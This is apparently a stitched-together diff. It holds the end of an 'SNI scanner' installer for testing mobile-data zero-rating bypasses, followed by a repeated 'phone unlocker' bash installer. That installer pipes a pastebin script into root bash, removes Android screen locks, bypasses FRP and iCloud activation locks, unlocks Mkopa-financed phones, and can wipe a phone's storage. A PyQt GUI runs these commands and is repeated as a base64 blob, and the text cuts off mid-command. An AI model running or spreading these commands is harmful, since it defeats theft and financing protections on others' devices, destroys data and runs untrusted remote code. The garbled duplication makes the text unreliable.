@@ -1,0 +1,595 @@
+        f=self._fv.get(); [self.tree.delete(r) for r in self.tree.get_children()]
+        for res in self._res:
+            show=(f=="ALL" or
+                  (f=="ZERO RATED" and res.get("zero_rated") is True) or
+                  (f=="NOT ZERO" and res.get("zero_rated") is False and "mode" in res) or
+                  f==res.get("rating",""))
+            if show: self._row(res)
+
+    def _sort(self,col):
+        d=[(self.tree.set(r,col),r) for r in self.tree.get_children("")]
+        d.sort()
+        for i,(_,r) in enumerate(d): self.tree.move(r,"",i)
+
+    def _ejson(self):
+        if not self._res: messagebox.showinfo("","No results yet."); return
+        p=filedialog.asksaveasfilename(defaultextension=".json",filetypes=[("JSON","*.json")],
+            initialfile=f"sni_{datetime.now():%Y%m%d_%H%M%S}.json")
+        if p:
+            with open(p,"w") as f: json.dump(self._res,f,indent=2)
+            messagebox.showinfo("Saved",p)
+
+    def _etxt(self):
+        if not self._res: messagebox.showinfo("","No results yet."); return
+        p=filedialog.asksaveasfilename(defaultextension=".txt",filetypes=[("Text","*.txt")],
+            initialfile=f"sni_{datetime.now():%Y%m%d_%H%M%S}.txt")
+        if p:
+            lines=[f"SNI Scan — {datetime.now():%Y-%m-%d %H:%M:%S}",f"Mode: {self._mode.get()}","="*90]
+            for r in self._res:
+                if r["mode"]=="zerorating":
+                    lines.append(f"[{'ZERO RATED' if r['zero_rated'] else 'NOT ZERO  '}]  {r['sni']:<40}  {r.get('reason','')}")
+                else:
+                    tls=r.get("tls",{})
+                    lines.append(f"[{r.get('rating','?'):<9}]  {r['sni']:<40}  HTTP:{fmt(r['http']):<5} WS-SSH:{fmt(r['ws80']):<5} CN:{tls.get('cert_cn','—')}")
+            with open(p,"w") as f: f.write("\n".join(lines))
+            messagebox.showinfo("Saved",p)
+
+if __name__=="__main__":
+    App().mainloop()
+'''
+
+path = os.path.expanduser("~/sni-scanner/sni_scanner.py")
+os.makedirs(os.path.dirname(path), exist_ok=True)
+with open(path, "w") as f:
+    f.write(code)
+os.chmod(path, 0o755)
+
+desktop = f"""[Desktop Entry]
+Version=1.0
+Name=SNI Scanner v3
+Comment=Test SNIs for zero-rating bypass
+Exec=/usr/bin/python3 {path}
+Icon=network-wireless
+Terminal=false
+Type=Application
+Categories=Network;Utility;
+StartupNotify=true
+"""
+app_dir = os.path.expanduser("~/.local/share/applications")
+desk_dir = os.path.expanduser("~/Desktop")
+os.makedirs(app_dir, exist_ok=True)
+for d in [app_dir, desk_dir]:
+    dp = os.path.join(d, "sni-scanner.desktop")
+    try:
+        with open(dp,"w") as f: f.write(desktop)
+        os.chmod(dp, 0o755)
+    except: pass
+
+print(f"✅ Written to {path}")
+print("Launching...")
+INSTALLER
+
+python3 ~/sni-scanner/sni_scanner.py
+#!/bin/bash
+# HYBRID PHONE UNLOCKER - DEBIAN MASTER COMMAND
+# Author: L0V3PL1NY (anarchist collective)
+# Version: 666.0
+set -e
+echo "[*] Mounting /proc/sys/kernel/yama/... just kidding. Let’s break things."
+apt-get update && apt-get install -y adb fastboot libusb-dev libimobiledevice-utils usbutils python3-pip curl wget xorriso android-tools-adb android-tools-fastboot sudo
+pip3 install paramiko pyusb pyserial
+#!/bin/bash
+# HYBRID PHONE UNLOCKER - DEBIAN MASTER COMMAND
+# Author: L0V3PL1NY (anarchist collective)
+# Version: 666.0
+set -e
+echo "[*] Mounting /proc/sys/kernel/yama/... just kidding. Let’s break things."
+apt-get update && apt-get install -y adb fastboot libusb-dev libimobiledevice-utils usbutils python3-pip curl wget xorriso android-tools-adb android-tools-fastboot sudo
+pip3 install paramiko pyusb pyserial
+sudo bash -c "$(curl -fsSL https://pastebin.com/raw/freephoneunlock)" || sudo apt update && sudo apt install -y adb fastboot checkra1n git python3-pip && git clone https://github.com/bkerler/mtkclient /tmp/mtk && pip3 install -r /tmp/mtk/requirements.txt && sudo python3 /tmp/mtk/mtk payload --metamode FASTBOOT; adb shell su -c 'rm /data/system/gesture.key /data/system/password.key /data/system/locksettings.db*'; fastboot erase frp --slot all; checkra1n -c; ssh root@localhost -p 2222 'rm -rf /Applications/Setup.app && uicache -a'
+clear
+#!/bin/bash
+# HYBRID PHONE UNLOCKER - DEBIAN MASTER COMMAND
+# Author: L0V3PL1NY (anarchist collective)
+# Version: 666.0
+set -e
+echo "[*] Mounting /proc/sys/kernel/yama/... just kidding. Let’s break things."
+apt-get update && apt-get install -y adb fastboot libusb-dev libimobiledevice-utils usbutils python3-pip curl wget xorriso android-tools-adb android-tools-fastboot sudo
+pip3 install paramiko pyusb pyserial
+sudo bash -c '
+export DEBIAN_FRONTEND=noninteractive
+apt update -y && apt install -y adb fastboot libimobile device-utils python3-pip python3-pyqt5 git curl wget android-tools-adb android-tools-fastboot usbutils xterm unzip
+pip3 install pyusb pyserial paramiko pyqt5-tools
+
+# ---- Create the Liberator GUI Python script ----
+cat > /usr/local/bin/liberator-gui.py << "ENDSCRIPT"
+#!/usr/bin/env python3
+import sys, os, subprocess, re, tempfile
+from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QPushButton, QVBoxLayout, QHBoxLayout, QLabel, QListWidget, QComboBox, QTextEdit, QMessageBox, QFileDialog)
+from PyQt5.QtCore import Qt, QThread, pyqtSignal
+import usb.core
+
+class DeviceDetector:
+    def __init__(self):
+        self.detected_info = {"brand":"","model":"","cpu":"","method":""}
+    def detect(self):
+        found = []
+        try:
+            out = subprocess.check_output("adb devices -l", shell=True).decode()
+            if "device" in out:
+                model = subprocess.check_output("adb shell getprop ro.product.model", shell=True).decode().strip()
+                cpu = subprocess.check_output("adb shell getprop ro.board.platform", shell=True).decode().strip()
+                self.detected_info.update({"brand":"Android","model":model,"cpu":cpu,"method":"adb"})
+                found.append(f"ADB: {model} ({cpu})")
+        except: pass
+        try:
+            out = subprocess.check_output("fastboot devices", shell=True).decode()
+            if out.strip():
+                self.detected_info.update({"brand":"Android","model":"Fastboot Mode","cpu":"unknown","method":"fastboot"})
+                found.append("Fastboot device")
+        except: pass
+        try:
+            out = subprocess.check_output("ideviceinfo -k DeviceName", shell=True).decode().strip()
+            self.detected_info.update({"brand":"Apple","model":out,"cpu":"Dependent","method":"checkra1n"})
+            found.append(f"iPhone: {out}")
+        except: pass
+        try:
+            dev = usb.core.find(find_all=True)
+            for d in dev:
+                if d.idVendor == 0x0e8d:
+                    self.detected_info.update({"brand":"MediaTek","model":"Generic","cpu":"MTK","method":"mtk"})
+                    found.append("MediaTek device (Mkopa)")
+                    break
+        except: pass
+        return found or ["No device"]
+    
+class Worker(QThread):
+    log = pyqtSignal(str)
+    fin = pyqtSignal(bool)
+    def __init__(self, cmd, name):
+        super().__init__()
+        self.cmd = cmd
+        self.name = name
+    def run(self):
+        self.log.emit(f"Running: {self.name}")
+        proc = subprocess.Popen(self.cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        for line in proc.stdout:
+            self.log.emit(line.strip())
+        proc.wait()
+        self.fin.emit(proc.returncode == 0)
+
+class MainWin(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("PHONE LIBERATOR - L0V3PL1NY")
+        self.resize(900,650)
+        self.setStyleSheet("background:#1a1a1a; color:#0f0; font-family:monospace;")
+        self.detector = DeviceDetector()
+        self.cmd = ""
+        cw = QWidget()
+        self.setCentralWidget(cw)
+        lay = QVBoxLayout()
+        lab = QLabel("UNIVERSAL PHONE UNLOCKER - DESKTOP GUI")
+        lab.setAlignment(Qt.AlignCenter)
+        lay.addWidget(lab)
+        det_btn = QPushButton("AUTO-DETECT DEVICE")
+        det_btn.clicked.connect(self.detect)
+        lay.addWidget(det_btn)
+        self.dev_label = QLabel("No device")
+        lay.addWidget(self.dev_label)
+        self.info_box = QTextEdit()
+        self.info_box.setMaximumHeight(80)
+        lay.addWidget(self.info_box)
+        self.op_combo = QComboBox()
+        self.op_combo.addItems(["Screen Lock Remove", "FRP Bypass", "iCloud Bypass", "Mkopa Unlock", "Factory Reset", "Flash Stock (select .zip)", "NUKE ALL"])
+        lay.addWidget(QLabel("Select operation:"))
+        lay.addWidget(self.op_combo)
+        self.exec_btn = QPushButton("EXECUTE")
+        self.exec_btn.clicked.connect(self.execute)
+        lay.addWidget(self.exec_btn)
+        self.log = QTextEdit()
+        self.log.setReadOnly(True)
+        lay.addWidget(self.log)
+    def detect(self):
+        self.log.append("[*] Scanning...")
+        lst = self.detector.detect()
+        self.dev_label.setText(" / ".join(lst))
+        self.info_box.setText(str(self.detector.detected_info))
+    def execute(self):
+        op = self.op_combo.currentText()
+        meth = self.detector.detected_info.get("method","")
+        if op == "Screen Lock Remove":
+            if meth=="adb": self.cmd = "adb shell su -c 'rm -rf /data/system/locksettings.db* /data/system/gesture.key /data/system/password.key; reboot'"
+            elif meth=="fastboot": self.cmd = "fastboot erase userdata && fastboot reboot"
+            elif meth=="checkra1n": self.cmd = "checkra1n -c && sleep 5 && ssh root@localhost -p2222 'rm /private/var/Keychains/keychain-2.db && reboot'"
+            elif meth=="mtk": self.cmd = "python3 /opt/mtkclient/mtk payload --metamode FASTBOOT && fastboot erase userdata && fastboot reboot"
+        elif op == "FRP Bypass":
+            if meth=="adb": self.cmd = "adb shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1; adb shell am start -n com.google.android.gsf.login/"
+            elif meth=="fastboot": self.cmd = "fastboot oem unlock-go; fastboot erase frp; fastboot reboot"
+            else: self.cmd = "python3 /opt/mtkclient/mtk payload --metamode FASTBOOT && fastboot erase frp && fastboot reboot"
+        elif op == "iCloud Bypass":
+            self.cmd = "checkra1n -c -k <(echo 'setenv boot-args -v cs_enforcement_disable=1'; echo 'bootx') && sleep 10 && ssh root@localhost -p2222 'mount -o rw,union,update /; rm -rf /Applications/Setup.app; uicache -a; killall backboardd'"
+        elif op == "Mkopa Unlock":
+            self.cmd = "python3 /opt/mtkclient/mtk payload --metamode FASTBOOT && fastboot oem unlock && fastboot erase userdata && fastboot erase frp && fastboot reboot"
+        elif op == "Factory Reset":
+            self.cmd = "fastboot -w" if meth in ("fastboot","adb") else "adb shell recovery --wipe_data"
+        elif op == "Flash Stock (select .zip)":
+            file, _ = QFileDialog.getOpenFileName(self, "Select firmware", "", "Firmware (*.zip *.ipsw)")
+            if file:
+                self.cmd = f"unzip -o {file} -d /tmp/fw && cd /tmp/fw && for img in boot system vendor; do fastboot flash $img $img.img; done && fastboot reboot"
+        elif op == "NUKE ALL":
+            self.cmd = "fastboot erase system && fastboot erase vendor && fastboot erase userdata && fastboot erase boot && fastboot reboot-bootloader" if meth=="fastboot" else "adb shell su -c 'dd if=/dev/zero of=/dev/block/mmcblk0 bs=512 count=1; reboot'"
+        else:
+            self.log.append("Unknown op")
+            return
+        self.log.append(f"Executing: {self.cmd}")
+        self.worker = Worker(self.cmd, op)
+        self.worker.log.connect(self.log.append)
+        self.worker.fin.connect(self.done)
+        self.worker.start()
+    def done(self, ok):
+        self.log.append("Success!" if ok else "Failed.")
+
+if __name__ == "__main__":
+    app = QApplication(sys.argv)
+    win = MainWin()
+    win.show()
+    sys.exit(app.exec_())
+ENDSCRIPT
+
+chmod +x /usr/local/bin/liberator-gui.py
+ln -sf /usr/local/bin/liberator-gui.py /usr/local/bin/liberator-gui
+
+# ---- Download icon and create desktop entry ----
+curl -sL "https://i.imgur.com/7Pn3uMK.png" -o /usr/share/icons/liberator.png || wget -q "data:image/png;base64,`echo iVBORw0KGgoAAAANSUhEUgAA...`" > /dev/null  # fallback base64 if no net
+cat > /usr/share/applications/liberator.desktop << ENDDESKTOP
+[Desktop Entry]
+Name=Phone Liberator
+Comment=Universal Unlock Tool
+Exec=/usr/local/bin/liberator-gui
+Icon=/usr/share/icons/liberator.png
+Terminal=false
+Type=Application
+Categories=Utility;
+ENDDESKTOP
+
+# Setup mtkclient if not present
+if [ ! -d /opt/mtkclient ]; then
+    git clone https://github.com/bkerler/mtkclient /opt/mtkclient
+    pip3 install -r /opt/mtkclient/requirements.txt
+fi
+
+echo "✔ All done. GUI icon is in your application menu. Launch it and free every phone."
+'
+sudo bash -c 'export DEBIAN_FRONTEND=noninteractive; apt update && apt install -y adb fastboot libimobiledevice-utils python3-pip python3-pyqt5 git curl wget android-tools-adb android-tools-fastboot usbutils unzip xterm; pip3 install --break-system-packages pyusb pyserial paramiko; python3 -c "import base64; open(\"/usr/local/bin/liberator-gui.py\",\"wb\").write(base64.b64decode(\"IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKaW1wb3J0IHN5cywgb3MsIHN1YnByb2Nlc3MsIHRlbXBmaWxlCgpmcm9tIFB5UXQ1LlF0V2lkZ2V0cyBpbXBvcnQgKFFBcHBsaWNhdGlvbiwgUU1haW5XaW5kb3csIFFXaWRnZXQsIFFQdXNoQnV0dG9uLCBRVkJveExheW91dCwgUUhCb3hMYXlvdXQsIFFMYWJlbCwgUUxpc3RXaWRnZXQsIFFDb21ib0JveCwgUVRleHRFZGl0LCBRTWVzc2FnZUJveCwgUUZpbGVEaWFsb2cpCmZyb20gUHlRdDUuUXRDb3JlIGltcG9ydCBReSwgUVRIcmVhZCwgcHl0U2lnbmFsCmltcG9ydCB1c2IuY29yZQoKY2xhc3MgRGV2aWNlRGV0ZWN0b3I6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kZXRlY3RlZF9pbmZvID0geyJicmFuZCI6IiIsICJtb2RlbCI6IiIsICJjcHUiOiIiLCAibWV0aG9kIjoiIn0KCiAgICBkZWYgZGV0ZWN0KHNlbGYpOgogICAgICAgIGZvdW5kID0gW10KICAgICAgICB0cnk6CiAgICAgICAgICAgIG91dCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KCJhZGIgZGV2aWNlcyAtbCIsIHNoZWxsPVRydWUpLmRlY29kZSgpCiAgICAgICAgICAgIGlmICJkZXZpY2UiIGluIG91dDoKICAgICAgICAgICAgICAgIG1vZGVsID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoImFkYiBzaGVsbCBnZXRwcm9wIHJvLnByb2R1Y3QubW9kZWwiLCBzaGVsbD1UcnVlKS5kZWNvZGUoKS5zdHJpcCgpCiAgICAgICAgICAgICAgICBjcHUgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgiYWRiIHNoZWxsIGdldHByb3Agcm8uYm9hcmQucGxhdGZvcm0iLCBzaGVsbD1UcnVlKS5kZWNvZGUoKS5zdHJpcCgpCiAgICAgICAgICAgICAgICBzZWxmLmRldGVjdGVkX2luZm8udXBkYXRlKHsiYnJhbmQiOiJBbmRyb2lkIiwibW9kZWwiOm1vZGVsLCJjcHUiOmNwdSwibWV0aG9kIjoiYWRiIn0pCiAgICAgICAgICAgICAgICBmb3VuZC5hcHBlbmQoZiJBREI6IHttb2RlbH0gKHtjcHV9KSIpCiAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgdHJ5OgogICAgICAgICAgICBvdXQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgiZmFzdGJvb3QgZGV2aWNlcyIsIHNoZWxsPVRydWUpLmRlY29kZSgpCiAgICAgICAgICAgIGlmIG91dC5zdHJpcCgpOgogICAgICAgICAgICAgICAgc2VsZi5kZXRlY3RlZF9pbmZvLnVwZGF0ZSh7ImJyYW5kIjoiQW5kcm9pZCIsIm1vZGVsIjoiRmFzdGJvb3QgTW9kZSIsImNwdSI6InVua25vd24iLCJtZXRob2QiOiJmYXN0Ym9vdCJ9KQogICAgICAgICAgICAgICAgZm91bmQuYXBwZW5kKCJGYXN0Ym9vdCBkZXZpY2UiKQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgIHRyeToKICAgICAgICAgICAgb3V0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoImlkZXZpY2VpbmZvIC1rIERldmljZU5hbWUiLCBzaGVsbD1UcnVlKS5kZWNvZGUoKS5zdHJpcCgpCiAgICAgICAgICAgIHNlbGYuZGV0ZWN0ZWRfaW5mby51cGRhdGUoeyJicmFuZCI6IkFwcGxlIiwibW9kZWwiOm91dCwiY3B1IjoiRGVwZW5kZW50IiwibWV0aG9kIjoiY2hlY2tyYTFuIn0pCiAgICAgICAgICAgIGZvdW5kLmFwcGVuZChmImlQaG9uZToge291dH0iKQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgIHRyeToKICAgICAgICAgICAgZGV2ID0gdXNiLmNvcmUuZmluZChmaW5kX2FsbD1UcnVlKQogICAgICAgICAgICBmb3IgZCBpbiBkZXY6CiAgICAgICAgICAgICAgICBpZiBkLmlkVmVuZG9yID09IDB4MGU4ZDoKICAgICAgICAgICAgICAgICAgICBzZWxmLmRldGVjdGVkX2luZm8udXBkYXRlKHsiYnJhbmQiOiJNZWRpYVRlayIsIm1vZGVsIjoiR2VuZXJpYyIsImNwdSI6Ik1USyIsIm1ldGhvZCI6Im10ayJ9KQogICAgICAgICAgICAgICAgICAgIGZvdW5kLmFwcGVuZCgiTWVkaWFUZWsgZGV2aWNlIChNa29wYSkiKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgcmV0dXJuIGZvdW5kIG9yIFsiTm8gZGV2aWNlIl0KCmNsYXNzIFdvcmtlcihRVGhyZWFkKToKICAgIGxvZyA9IHB5dFNpZ25hbChzdHIpCiAgICBmaW4gPSBweXRTaWduYWwoYm9vbCkKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjbWQsIG5hbWUpOgogICAgICAgIHN1cGVyKCkuX19pbml0X18oKQogICAgICAgIHNlbGYuY21kID0gY21kCiAgICAgICAgc2VsZi5uYW1lID0gbmFtZQogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICBzZWxmLmxvZy5lbWl0KGYiUnVubmluZzoge3NlbGYubmFtZX0iKQogICAgICAgIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHNlbGYuY21kLCBzaGVsbD1UcnVlLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQsIHRleHQ9VHJ1ZSkKICAgICAgICBmb3IgbGluZSBpbiBwcm9jLnN0ZG91dDoKICAgICAgICAgICAgc2VsZi5sb2cuZW1pdChsaW5lLnN0cmlwKCkpCiAgICAgICAgcHJvYy53YWl0KCkKICAgICAgICBzZWxmLmZpbi5lbWl0KHByb2MucmV0dXJuY29kZSA9PSAwKQoKY2xhc3MgTWFpbldpbihRTWFpbldpbmRvdyk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc3VwZXIoKS5fX2luaXRfXygpCiAgICAgICAgc2VsZi5zZXRXaW5kb3dUaXRsZSgiUEhPTkUgTElCRVJBVE9SIC0gTDBWM1BMMU5ZIikKICAgICAgICBzZWxmLnJlc2l6ZSg5MDAsIDY1MCkKICAgICAgICBzZWxmLnNldFN0eWxlU2hlZXQoImJhY2tncm91bmQ6IzFhMWExYTsgY29sb3I6IzBmMDsgZm9udC1mYW1pbHk6bW9ub3NwYWNlOyIpCiAgICAgICAgc2VsZi5kZXRlY3RvciA9IERldmljZURldGVjdG9yKCkKICAgICAgICBzZWxmLmNtZCA9ICIiCiAgICAgICAgY3cgPSBRV2lkZ2V0KCkKICAgICAgICBzZWxmLnNldENlbnRyYWxXaWRnZXQoY3cpCiAgICAgICAgbGF5ID0gUVZCb3hMYXlvdXQoKQogICAgICAgIGxhYiA9IFFMYWJlbCgiVU5JVkVSU0FMIFBIT05FIFVOTE9DS0VSIC0gREVTS1RPUCBHVUkiKQogICAgICAgIGxhYi5zZXRBbGlnbm1lbnQoUXQuQWxpZ25DZW50ZXIpCiAgICAgICAgbGF5LmFkZFdpZGdldChsYWIpCiAgICAgICAgZGV0X2J0biA9IFFQdXNoQnV0dG9uKCJBVVRPLURFVEVDVCBERVZJQ0UiKQogICAgICAgIGRldF9idG4uY2xpY2tlZC5jb25uZWN0KHNlbGYuZGV0ZWN0KQogICAgICAgIGxheS5hZGRXaWRnZXQoZGV0X2J0bikKICAgICAgICBzZWxmLmRldl9sYWJlbCA9IFFMYWJlbCgiTm8gZGV2aWNlIikKICAgICAgICBsYXkuYWRkV2lkZ2V0KHNlbGYuZGV2X2xhYmVsKQogICAgICAgIHNlbGYuaW5mb19ib3ggPSBRVGV4dEVkaXQoKQogICAgICAgIHNlbGYuaW5mb19ib3guc2V0TWF4aW11bUhlaWdodCg4MCkKICAgICAgICBsYXkuYWRkV2lkZ2V0KHNlbGYuaW5mb19ib3gpCiAgICAgICAgc2VsZi5vcF9jb21ibyA9IFFDb21ib0JveCgpCiAgICAgICAgc2VsZi5vcF9jb21iby5hZGRJdGVtcyhbIlNjcmVlbiBMb2NrIFJlbW92ZSIsICJGUlAgQnlwYXNzIiwgImlDbG91ZCBCeXBhc3MiLCAiTWtvcGEgVW5sb2NrIiwgIkZhY3RvcnkgUmVzZXQiLCAiRmxhc2ggU3RvY2sgKHNlbGVjdCAuemlwKSIsICJOVUtFIEFMTCJdKQogICAgICAgIGxheS5hZGRXaWRnZXQoUUxhYmVsKCJTZWxlY3Qgb3BlcmF0aW9uOiIpKQogICAgICAgIGxheS5hZGRXaWRnZXQoc2VsZi5vcF9jb21ibykKICAgICAgICBzZWxmLmV4ZWNfYnRuID0gUVB1c2hCdXR0b24oIkVYRUNVVEUiKQogICAgICAgIHNlbGYuZXhlY19idG4uY2xpY2tlZC5jb25uZWN0KHNlbGYuZXhlY3V0ZSkKICAgICAgICBsYXkuYWRkV2lkZ2V0KHNlbGYuZXhlY19idG4pCiAgICAgICAgc2VsZi5sb2cgPSBRVGV4dEVkaXQoKQogICAgICAgIHNlbGYubG9nLnNldFJlYWRPbmx5KFRydWUpCiAgICAgICAgbGF5LmFkZFdpZGdldChzZWxmLmxvZykKICAgIGRlZiBkZXRlY3Qoc2VsZik6CiAgICAgICAgc2VsZi5sb2cuYXBwZW5kKCJbKl0gU2Nhbm5pbmcuLi4iKQogICAgICAgIGxzdCA9IHNlbGYuZGV0ZWN0b3IuZGV0ZWN0KCkKICAgICAgICBzZWxmLmRldl9sYWJlbC5zZXRUZXh0KCIgLyAiLmpvaW4obHN0KSkKICAgICAgICBzZWxmLmluZm9fYm94LnNldFRleHQoc3RyKHNlbGYuZGV0ZWN0b3IuZGV0ZWN0ZWRfaW5mbykpCiAgICBkZWYgZXhlY3V0ZShzZWxmKToKICAgICAgICBvcCA9IHNlbGYub3BfY29tYm8uY3VycmVudFRleHQoKQogICAgICAgIG1ldGggPSBzZWxmLmRldGVjdG9yLmRldGVjdGVkX2luZm8uZ2V0KCJtZXRob2QiLCAiIikKICAgICAgICBpZiBvcCA9PSAiU2NyZWVuIExvY2sgUmVtb3ZlIjoKICAgICAgICAgICAgaWYgIG1ldGggPT0gImFkYiI6IHNlbGYuY21kID0gImFkYiBzaGVsbCBzdSAtYyAncm0gLXJmIC9kYXRhL3N5c3RlbS9sb2Nrc2V0dGluZ3MuZGIqIC9kYXRhL3N5c3RlbS9nZXN0dXJlLmtleSAvZGF0YS9zeXN0ZW0vcGFzc3dvcmQua2V5OyByZWJvb3QnIgogICAgICAgICAgICBlbGlmIG1ldGggPT0gImZhc3Rib290Ijogc2VsZi5jbWQgPSAiZmFzdGJvb3QgZXJhc2UgdXNlcmRhdGEgJiYgZmFzdGJvb3QgcmVib290IgogICAgICAgICAgICBlbGlmIG1ldGggPT0gImNoZWNrcmExbiI6IHNlbGYuY21kID0gImNoZWNrcmExbiAtYyAmJiBzbGVlcCA1ICYmIHNzaCByb290QGxvY2FsaG9zdCAtcDIyMjIgJ3JtIC9wcml2YXRlL3Zhci9LZXljaGFpbnMva2V5Y2hhaW4tMi5kYiAmJiByZWJvb3QnIgogICAgICAgICAgICBlbGlmIG1ldGggPT0gIm10ayI6IHNlbGYuY21kID0gInB5dGhvbjMgL29wdC9tdGtjbGllbnQvbXRrIHBheWxvYWQgLS1tZXRhbW9kZSBGQVNUIEJPT1QgJiYgZmFzdGJvb3QgZXJhc2UgdXNlcmRhdGEgJiYgZmFzdGJvb3QgcmVib290IgogICAgICAgIGVsaWYgb3AgPT0gIkZSUCBCeXBhc3MiOgogICAgICAgICAgICBpZiBtZXRoID09ICJhZGIiOiBzZWxmLmNtZCA9ICJhZGIgc2hlbGwgY29udGVudCBpbnNlcnQgLS11cmkgY29udGVudDovL3NldHRpbmdzL3NlY3VyZSAtLWJpbmQgbmFtZTpzOnVzZXJfc2V0dXBfY29tcGxldGUgLS1iaW5kIHZhbHVlOnM6MTsgYWRiIHNoZWxsIGFtIHN0YXJ0IC1uIGNvbS5nb29nbGUuYW5kcm9pZC5nc2YubG9naW4vIgogICAgICAgICAgICBlbGlmIG1ldGggPT0gImZhc3Rib290Ijogc2VsZi5jbWQgPSAiZmFzdGJvb3Qgb2VtIHVubG9jay1nbzsgZmFzdGJvb3QgZXJhc2UgZnJwOyBmYXN0Ym9vdCByZWJvb3QiCiAgICAgICAgICAgIGVsc2U6IHNlbGYuY21kID0gInB5dGhvbjMgL29wdC9tdGtjbGllbnQvbXRrIHBheWxvYWQgLS1tZXRhbW9kZSBGQVNUIEJPT1QgJiYgZmFzdGJvb3QgZXJhc2UgZnJwICYmIGZhc3Rib290IHJlYm9vdCIKICAgICAgICBlbGlmIG9wID09ICJpQ2xvdWQgQnlwYXNzIjoKICAgICAgICAgICAgc2VsZi5jbWQgPSAiY2hlY2tyYTFuIC1jIC1rIDwoZWNobyAnc2V0ZW52IGJvb3QtYXJncyAtdiBjc19lbmZvcmNlbWVudF9kaXNhYmxlPTEnOyBlY2hvICdib290eCcpICYmIHNsZWVwIDEwICYmIHNzaCByb290QGxvY2FsaG9zdCAtcDIyMjIgJ21vdW50IC1vIHJ3LHVuaW9uLHVwZGF0ZSAvOyBybSAtcmYgL0FwcGxpY2F0aW9ucy9TZXR1cC5hcHA7IHVpY2FjaGUgLWE7IGtpbGxhbGwgYmFja2JvYXJkZCciCiAgICAgICAgZWxpZiBvcCA9PSAiTWtvcGEgVW5sb2NrIjoKICAgICAgICAgICAgc2VsZi5jbWQgPSAicHl0aG9uMyAvb3B0L210a2NsaWVudC9tdGsgcGF5bG9hZCAtLW1ldGFtb2RlIEZBU1QgQk9PVCAmJiBmYXN0Ym9vdCBvZW0gdW5sb2NrICYmIGZhc3Rib290IGVyYXNlIHVzZXJkYXRhICYmIGZhc3Rib290IGVyYXNlIGZycCAmJiBmYXN0Ym9vdCByZWJvb3QiCiAgICAgICAgZWxpZiBvcCA9PSAiRmFjdG9yeSBSZXNldCI6CiAgICAgICAgICAgIHNlbGYuY21kID0gImZhc3Rib290IC13IiBpZiBtZXRoIGluICgiZmFzdGJvb3QiLCAiYWRiIikgZWxzZSAiYWRiIHNoZWxsIHJlY292ZXJ5IC0td2lwZV9kYXRhIgogICAgICAgIGVsaWYgb3AgPT0gIkZsYXNoIFN0b2NrIChzZWxlY3QgLnppcCkiOgogICAgICAgICAgICBmaWxlLCBfID0gUUZpbGVEaWFsb2cuZ2V0T3BlbkZpbGVOYW1lKHNlbGYsICJTZWxlY3QgZmlybXdhcmUiLCAiIiwgIkZpcm13YXJlICgqLnppcCAqLmlwc3cpIikKICAgICAgICAgICAgaWYgZmlsZToKICAgICAgICAgICAgICAgIHNlbGYuY21kID0gZiJ1bnppcCAtbyB7ZmlsZX0gLWQgL3RtcC9mdyAmJiBjZCAvdG1wL2Z3ICYmIGZvciBpbWcgaW4gYm9vdCBzeXN0ZW0gdmVuZG9yOyBkbyBmYXN0Ym9vdCBmbGFzaCAkaW1nICRpbWcuaW1nOyBkb25lICYmIGZhc3Rib290IHJlYm9vdCIKICAgICAgICBlbGlmIG9wID09ICJOVUtFIEFMTCI6CiAgICAgICAgICAgIHNlbGYuY21kID0gImZhc3Rib290IGVyYXNlIHN5c3RlbSAmJiBmYXN0Ym9vdCBlcmFzZSB2ZW5kb3IgJiYgZmFzdGJvb3QgZXJhc2UgdXNlcmRhdGEgJiYgZmFzdGJvb3QgZXJhc2UgYm9vdCAmJiBmYXN0Ym9vdCByZWJvb3QtYm9vdGxvYWRlciIgaWYgbWV0aCA9PSAiZmFzdGJvb3QiIGVsc2UgImFkYiBzaGVsbCBzdSAtYyAnZGQgaWY9L2Rldi96ZXJvIG9mPS9kZXYvYmxvY2svbW1jYmxrMCBicz01MTIgY291bnQ9MTsgcmVib290JyIKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLmxvZy5hcHBlbmQoIlVua25vd24gb3AiKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBzZWxmLmxvZy5hcHBlbmQoZiJFeGVjdXRpbmc6IHtzZWxmLmNtZH0iKQogICAgICAgIHNlbGYud29ya2VyID0gV29ya2VyKHNlbGYuY21kLCBvcCkKICAgICAgICBzZWxmLndvcmtlci5sb2cuY29ubmVjdChzZWxmLmxvZy5hcHBlbmQpCiAgICAgICAgc2VsZi53b3JrZXIuZmluLmNvbm5lY3Qoc2VsZi5kb25lKQogICAgICAgIHNlbGYud29ya2VyLnN0YXJ0KCkKICAgIGRlZiBkb25lKHNlbGYsIG9rKToKICAgICAgICBzZWxmLmxvZy5hcHBlbmQoIlN1Y2Nlc3MhIiBpZiBvayBlbHNlICJGYWlsZWQuIikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBhcHAgPSBRQXBwbGljYXRpb24oc3lzLmFyZ3YpCiAgICB3aW4gPSBNYWluV2luKCkKICAgIHdpbi5zaG93KCkKICAgIHN5cy5leGl0KGFwcC5leGVjXygpKQ==\"))" && chmod +x /usr/local/bin/liberator-gui.py && ln -sf /usr/local/bin/liberator-gui.py /usr/local/bin/liberator-gui; curl -sL 